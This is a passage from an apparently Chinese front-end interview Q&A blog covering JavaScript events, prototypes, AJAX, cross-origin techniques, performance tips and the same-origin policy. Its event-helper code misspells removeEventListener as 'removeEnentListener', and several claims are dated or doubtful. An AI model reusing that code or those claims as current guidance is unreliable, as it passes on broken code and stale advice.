class="line">stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (ev.stopPropagation) &#123;</div><div class="line">ev.stopPropagation();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">ev.cancelBubble = <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 取消事件的默认行为</span></div><div class="line">preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">event.preventDefault();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">event.returnValue = <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取事件目标</span></div><div class="line">getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></div><div class="line">getEvent : <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</div><div class="line"><span class="keyword">if</span> (!ev) &#123;</div><div class="line"><span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</div><div class="line"><span class="keyword">while</span> (c) &#123;</div><div class="line">ev = c.arguments[<span class="number">0</span>];</div><div class="line"><span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">c = c.caller;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ev;</div><div class="line">&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><blockquote><p>new操作符具体干了什么呢?</p></blockquote><p>1） 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型<br>2） 属性和方法被加入到 this 引用的对象中<br>3） 新创建的对象由 this 所引用，并且最后隐式的返回 this<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var obj  = &#123;&#125;<span class="comment">;</span></div><div class="line">obj.__proto__ = Base.prototype<span class="comment">;</span></div><div class="line">Base.call(obj)<span class="comment">;</span></div></pre></td></tr></table></figure></p><blockquote><p>对JSON 的了解？</p></blockquote><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小。<br> <code>{&quot;age&quot;:&quot;12&quot;, &quot;name&quot;:&quot;back&quot;}</code></p><blockquote><p>js延迟加载的方式有哪些？</p></blockquote><p>1） defer和async<br>2） 动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）<br>3） 按需异步载入js</p><blockquote><p>如何解决跨域问题?</p></blockquote><p>1） jsonp（jsonp 的原理是动态插入 script 标签）<br>2） document.domain + iframe<br>3） window.name、window.postMessage<br>4） 服务器上设置代理页面</p><blockquote><p>documen.write和 innerHTML 的区别</p></blockquote><p><code>document.write</code> 只能重绘整个页面</p><p><code>innerHTML</code> 可以重绘页面的一部分</p><blockquote><p>.call() 和 .apply() 的作用？</p></blockquote><p>改变上下文，即this的指向</p><blockquote><p>哪些操作会造成内存泄漏？</p></blockquote><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。<br>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p><p>1） setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。<br>2） 闭包<br>3） 控制台日志<br>4） 循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</p><blockquote><p>如何判断当前脚本运行在浏览器还是node环境中？</p></blockquote><p>通过判断 Global 对象是否为window，如果不为window，当前脚本没有运行在浏览器中。即在node中的全局变量是global ,浏览器的全局变量是window。 可以通过该全局变量是否定义来判断宿主环境</p><blockquote><p>什么叫优雅降级和渐进增强？</p></blockquote><p>1） 优雅降级：Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效。</p><p>2） 渐进增强：从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。</p><blockquote><p>对Node的优点和缺点提出了自己的看法？</p></blockquote><p>优点：<br>1） 因为Node是基于事件驱动和无阻塞的，所以非常适合处理并发请求，因此构建在Node上的代理服务器相比其他技术实现（如Ruby）的服务器表现要好得多。<br>2） 与Node代理服务器交互的客户端代码是由javascript语言编写的，因此客户端和服务器端都用同一种语言编写，这是非常美妙的事情。</p><p>缺点：<br>1） Node是一个相对新的开源项目，所以不太稳定，它总是一直在变。<br>2） 缺少足够多的第三方库支持。看起来，就像是Ruby/Rails当年的样子（第三方库现在已经很丰富了，所以这个缺点可以说不存在了）。</p><blockquote><p>对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？</p></blockquote><p>前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。<br>1） 实现界面交互<br>2） 提升用户体验<br>3） 有了Node.js，前端可以实现服务端的一些事情</p><p>前景：<br>1） 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好<br>2） 参与项目，快速高质量完成实现效果图，精确到1px；<br>3） 与团队成员，UI设计，产品经理的沟通；<br>4） 做好的页面结构，页面重构和用户体验；<br>5） 处理hack，兼容、写出优美的代码格式；<br>6） 针对服务器的优化、拥抱最新前端技术。</p><blockquote><p>你有哪些性能优化的方法？</p></blockquote><p>1） 减少http请求次数：CSS Sprites, JS、CSS 源码压缩、图片大小控制合适；网页 Gzip，CDN 托管，data 缓存 ，图片服务器<br>2） 前端模板 JS + 数据，减少由于HTML标签导致的带宽浪费，前端用变量保存 AJAX 请求结果，每次操作本地变量，不用请求，减少请求次数<br>3） 用 innerHTML 代替 DOM 操作，减少 DOM 操作次数，优化 javascript 性能<br>4） 当需要设置的样式很多时设置 className 而不是直接操作 style<br>5） 少用全局变量、缓存DOM节点查找的结果。减少 IO 读取操作<br>6） 避免使用 CSS Expression（css表达式)又称 Dynamic properties(动态属性)<br>7） 图片预加载，将样式表放在顶部，将脚本放在底部，加上时间戳</p><blockquote><p>http状态码有那些？分别代表是什么意思？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/04/02/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？</p></blockquote><p>分为4个步骤：<br>1） 当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。<br>2） 浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。<br>3） 一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。<br>4） 此时，Web 服务器提供资源服务，客户端开始下载资源。</p><p>请求返回后，便进入了我们关注的前端模块<br>简单来说，浏览器会解析 HTML 生成 DOM Tree，其次会根据 CSS 生成 CSS Rule Tree，而 javascript 又可以根据 DOM API 操作 DOM</p><blockquote><p>平时如何管理你的项目？</p></blockquote><p>1） 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等<br>2） 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）<br>3） 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）<br>4） 页面进行标注（例如 页面 模块 开始和结束）<br>5） CSS 跟 HTML 分文件夹并行存放，命名都得统一（例如 style.css）<br>6） JS 分文件夹存放 命名以该 JS 功能为准的英文翻译<br>7） 图片采用整合的 images.png png8 格式文件使用 尽量整合在一起使用方便将来的管理 </p><blockquote><p>说说最近最流行的一些东西吧？常去的哪些网站？</p></blockquote><p>最流行的一些东西：<br>1） Node.js<br>2） Mongodb<br>3） npm<br>4） MVVM<br>5） MEAN<br>6） three.js<br>7） React</p><p>常去的网站：<br>1） 牛客网<br>2） Github<br>3） CSDN</p><blockquote><p>javascript对象的几种创建方式</p></blockquote><p>1） 工厂模式<br>2） 构造函数模式<br>3） 原型模式<br>4） 混合构造函数和原型模式<br>5） 动态原型模式<br>6） 寄生构造函数模式<br>7） 稳妥构造函数模式</p><blockquote><p>javascript继承的 6 种方法</p></blockquote><p>1） 原型链继承<br>2） 借用构造函数继承<br>3） 组合继承(原型+借用构造)<br>4） 原型式继承<br>5） 寄生式继承<br>6） 寄生组合式继承</p><blockquote><p>ajax 的过程是怎样的</p></blockquote><p>1） 创建XMLHttpRequest对象,也就是创建一个异步调用对象<br>2） 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息<br>3） 设置响应HTTP请求状态变化的函数<br>4） 发送HTTP请求<br>5） 获取异步调用返回的数据<br>6） 使用JavaScript和DOM实现局部刷新</p><blockquote><p>异步加载和延迟加载</p></blockquote><p>1） 异步加载的方案： 动态插入 script 标签<br>2） 通过 ajax 去获取 js 代码，然后通过 eval 执行<br>3） script 标签上添加 defer 或者 async 属性<br>4） 创建并插入 iframe，让它异步执行 js<br>5） 延迟加载：有些 js 代码并不是页面初始化的时候就立刻需要的，而稍后的某些情况才需要的</p><blockquote><p>前端的安全问题？</p></blockquote><p>1） XSS<br>2） sql注入<br>3） CSRF：是跨站请求伪造，很明显根据刚刚的解释，他的核心也就是请求伪造，通过伪造身份提交POST和GET请求来进行跨域的攻击</p><p>完成CSRF需要两个步骤：<br>1） 登陆受信任的网站A，在本地生成 COOKIE<br>2） 在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。</p><blockquote><p>ie 各版本和 chrome 可以并行下载多少个资源</p></blockquote><p>1） IE6 2 个并发<br>2） iE7 升级之后的 6 个并发，之后版本也是 6 个<br>3） Firefox，chrome 也是6个</p><blockquote><p>javascript里面的继承怎么实现，如何避免原型链上面的对象共享</p></blockquote><p>用构造函数和原型链的混合模式去实现继承，避免对象共享可以参考经典的extend()函数，很多前端框架都有封装的，就是用一个空函数当做中间变量。</p><blockquote><p>grunt， YUI compressor 和 google clojure用来进行代码压缩的用法。</p></blockquote><p><strong>grunt：</strong><br>UglifyJS 是基于 NodeJS 的 Javascript 语法解析/压缩/格式化工具<br><a href="http://lisperator.net/uglifyjs/" target="_blank" rel="external">官网：</a> || <a href="https://github.com/mishoo/UglifyJS2" target="_blank" rel="external">或者：</a><br>安装：<br> <code>$ npm install uglify-js -g</code><br>使用方法见官网 demo</p><p><strong>YUI compressor：</strong><br>YUI Compressor 是一个用来压缩 JS 和 CSS 文件的工具，采用Java开发。<br>使用方法：<br>// 压缩JS<br> <code>java -jar yuicompressor-2.4.2.jar --type js --charset utf-8 -v src.js &gt; packed.js</code><br>// 压缩CSS<br> <code>java -jar yuicompressor-2.4.2.jar --type css --charset utf-8 -v src.css &gt; packed.css</code></p><p><strong>Google Closure Compiler：</strong><br><a href="https://developers.google.com/closure/compiler/" target="_blank" rel="external">官网：</a><br>使用方法：<br>1） 在命令行下使用一个google编译好的java程序<br>2） 使用google提供的在线服务<br>3） 使用google提供的RESTful API</p><blockquote><p>Flash、Ajax各自的优缺点，在使用中如何取舍？</p></blockquote><p>Flash：<br>1） Flash适合处理多媒体、矢量图形、访问机器<br>2） 对CSS、处理文本上不足，不容易被搜索</p><p>Ajax：<br>1） Ajax对CSS、文本支持很好，支持搜索<br>2） 多媒体、矢量图形、机器访问不足</p><p>共同点：<br>1） 与服务器的无刷新传递消息<br>2） 可以检测用户离线和在线状态<br>3） 操作DOM</p><blockquote><p>请解释一下 JavaScript 的同源策略。</p></blockquote><p>概念：<br>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。<br>这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。</p><p>为什么要有同源限制：<br>我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。</p><blockquote><p>为什么要有同源限制？</p></blockquote><p>我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。</p><blockquote><p>什么是 “use strict”; ? 使用它的好处和坏处分别是什么？</p></blockquote><p>1) use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,</p><p>2) 使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。</p><p>3) 提高编译器效率，增加运行速度；</p><p>4) 为未来新版本的Javascript标准化做铺垫。</p><p>缺点：现在网站的 JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。</p><blockquote><p>GET和POST的区别，何时使用POST？</p></blockquote><p>GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符<br>POST：一般用于修改服务器上的资源，对所发送的信息没有限制</p><p>GET方式需要使用 Request.QueryString 来取得变量的值<br>POST方式通过 Request.Form 来获取变量的值<br>也就是说 Get 是通过地址栏来传值，而 Post 是通过提交表单来传值。</p><p>在以下情况中，请使用 POST 请求：<br>1)  无法使用缓存文件（更新服务器上的文件或数据库）<br>2)  向服务器发送大量数据（POST 没有数据量限制）<br>3)  发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p><blockquote><p>哪些地方会出现css阻塞，哪些地方会出现js阻塞？</p></blockquote><p>js 的阻塞特性：所有浏览器在下载 JS 的时候，会阻止一切其他活动，比如其他资源的下载，内容的呈现等等。直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。<br>由于浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。<br>嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。</p><p>CSS 怎么会阻塞加载了？CSS 本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6 下 CSS 都是阻塞加载）<br>当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。<br>根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。</p><p>嵌入JS应该放在什么位置？<br>1)  放在底部，虽然放在底部照样会阻塞所有呈现，但不会阻塞资源下载。<br>2)  如果嵌入JS放在head中，请把嵌入JS放在CSS头部。<br>3)  使用 defer（只支持IE）<br>4)  不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用 setTimeout 来调用</p><p>Javascript无阻塞加载具体方式：<br>1)  将脚本放在底部。<code>&lt;link&gt;</code>还是放在head中，用以保证在js加载前，能加载出正常显示的页面。<code>&lt;script&gt;</code>标签放在<code>&lt;/body&gt;</code>前。<br>2)  阻塞脚本：由于每个<code>&lt;script&gt;</code>标签下载时阻塞页面解析过程，所以限制页面的<code>&lt;script&gt;</code>总数也可以改善性能。适用于内联脚本和外部脚本。<br>3)  非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 <code>window.onload</code> 事件发出后开始下载代码。<br>4)  defer属性：支持IE4和fierfox3.5更高版本浏览器<br>5)  动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容。代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="keyword">var</span> script=<span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">    script.type=<span class="string">"text/javascript"</span>;</div><div class="line">    script.src=<span class="string">"file.js"</span>;</div><div class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(script);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p>此技术的重点在于：无论在何处启动下载，文件额下载和运行都不会阻塞其他页面处理过程，即使在head里（除了用于下载文件的 http 链接）。</p><blockquote><p>eval是做什么的？</p></blockquote><p>1) 它的功能是把对应的字符串解析成JS代码并运行<br>2) 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）</p><blockquote><p>写一个通用的事件侦听器函数</p></blockquote><p>// event(事件)工具集，<a href="github.com/markyun">来源：</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">markyun.Event = &#123;</div><div class="line">    <span class="comment">// 页面加载完成后</span></div><div class="line">    readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</div><div class="line">            fn=<span class="built_in">document</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line">            <span class="built_in">window</span>.onload = fn;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                oldonload();</div><div class="line">                fn();</div><div class="line">            &#125;;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></div><div class="line">    <span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></div><div class="line">    addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line">            <span class="comment">//事件类型、需要执行的函数、是否捕捉</span></div><div class="line">            element.addEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">            element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                handler.call(element);</div><div class="line">            &#125;);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            element[<span class="string">'on'</span> + type] = handler;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 移除事件</span></div><div class="line">    removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (element.removeEnentListener) &#123;</div><div class="line">            element.removeEnentListener(type, handler, <span class="literal">false</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</div><div class="line">            element.detachEvent(<span class="string">'on'</span> + type, handler);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;, </div><div class="line">    <span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></div><div class="line">    stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (ev.stopPropagation) &#123;</div><div class="line">            ev.stopPropagation();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            ev.cancelBubble = <span class="literal">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 取消事件的默认行为</span></div><div class="line">    preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">            event.preventDefault();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            event.returnValue = <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 获取事件目标</span></div><div class="line">    getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></div><div class="line">    getEvent : <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</div><div class="line">        <span class="keyword">if</span> (!ev) &#123;</div><div class="line">            <span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</div><div class="line">            <span class="keyword">while</span> (c) &#123;</div><div class="line">                ev = c.arguments[<span class="number">0</span>];</div><div class="line">                <span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">                c = c.caller;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ev;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><blockquote><p>Node.js 的适用场景</p></blockquote><p>1)  高并发<br>2)  聊天<br>3)  实时消息推送   </p><blockquote><p>JavaScript 原型，原型链 ? 有什么特点？</p></blockquote><p>1)  原型对象也是普通的对象，是对象一个自带隐式的 <code>__proto__</code>属性，原型也有可能有自己的原型，如果一个原型对象的原型不为 <code>null</code> 的话，我们就称之为原型链<br>2)  原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链</p><blockquote><p>怎么重构页面？</p></blockquote><p>1) 编写 CSS<br>2) 让页面结构更合理化，提升用户体验<br>3) 实现良好的页面效果和提升性能</p><blockquote><p>WEB应用从服务器主动推送Data到客户端有那些方式？</p></blockquote><p>1)  html5 websocket<br>2)  WebSocket 通过 Flash<br>3)  XHR长时间连接<br>4)  XHR Multipart Streaming<br>5)  不可见的Iframe<br>6)  <code>&lt;script&gt;</code>标签的长时间连接(可跨域)</p><blockquote><p>事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</p></blockquote><p>1)  我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为<br>2)  事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件<br>3)  <code>ev.stopPropagation();</code><br>注意旧ie的方法：<code>ev.cancelBubble = true;</code></p><blockquote><p>Ajax 是什么？Ajax 的交互模型？同步和异步的区别？如何解决跨域问题？</p></blockquote><p>Ajax 是什么：<br>1) 通过异步模式，提升了用户体验<br>2) 优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用<br>3) Ajax 在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。</p><p>Ajax 的最大的特点：<br>1) Ajax可以实现动态不刷新（局部刷新）<br>2) readyState 属性 状态 有5个可取值： 0 = 未初始化，1 = 启动， 2 = 发送，3 = 接收，4 = 完成</p><p>Ajax 同步和异步的区别:<br>1)  同步：提交请求 -&gt; 等待服务器处理 -&gt; 处理完毕返回，这个期间客户端浏览器不能干任何事<br>2)  异步：请求通过事件触发 -&gt; 服务器处理（这是浏览器仍然可以作其他事情）-&gt; 处理完毕<br>ajax.open方法中，第3个参数是设同步或者异步。</p><p>Ajax 的缺点：<br>1)  Ajax 不支持浏览器 back 按钮<br>3)  安全问题 Ajax 暴露了与服务器交互的细节<br>4)  对搜索引擎的支持比较弱<br>5)  破坏了程序的异常机制<br>6)  不容易调试</p><p>解决跨域问题：<br>1)  jsonp<br>2)  iframe<br>3)  window.name、window.postMessage<br>4)  服务器上设置代理页面</p><blockquote><p>js对象的深度克隆代码实现</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">Obj</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> buf;   </div><div class="line">    <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</div><div class="line">        buf = [];  <span class="comment">// 创建一个空的数组</span></div><div class="line">        <span class="keyword">var</span> i = Obj.length;</div><div class="line">        <span class="keyword">while</span> (i--) &#123;</div><div class="line">            buf[i] = clone(Obj[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> buf;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Object</span>)&#123;</div><div class="line">        buf = &#123;&#125;;  <span class="comment">// 创建一个空对象</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> Obj) &#123;  <span class="comment">// 为这个对象添加新的属性</span></div><div class="line">            buf[k] = clone(Obj[k]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> buf;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> Obj;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>对网站重构的理解</p></blockquote><p>网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变 UI 的情况下，对网站进行优化，在扩展的同时保持一致的 UI。</p><p>对于传统的网站来说重构通常是：<br>1)  表格(table)布局改为 DIV + CSS<br>2)  使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对 IE6 有效的)<br>3)  对于移动平台的优化<br>4)  针对于 SEO 进行优化<br>5)  深层次的网站重构应该考虑的方面<br>6)  减少代码间的耦合<br>7)  让代码保持弹性<br>8)  严格按规范编写代码<br>9)  设计可扩展的API<br>10)  代替旧有的框架、语言(如VB)<br>11)  增强用户体验<br>12)  通常来说对于速度的优化也包含在重构中<br>13)  压缩JS、CSS、image等前端资源(通常是由服务器来解决)<br>14)  程序的性能优化(如数据读写)<br>15)  采用CDN来加速资源加载<br>16)  对于JS DOM的优化<br>17)  HTTP服务器的文件缓存</p><blockquote><p>如何获取UA</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span 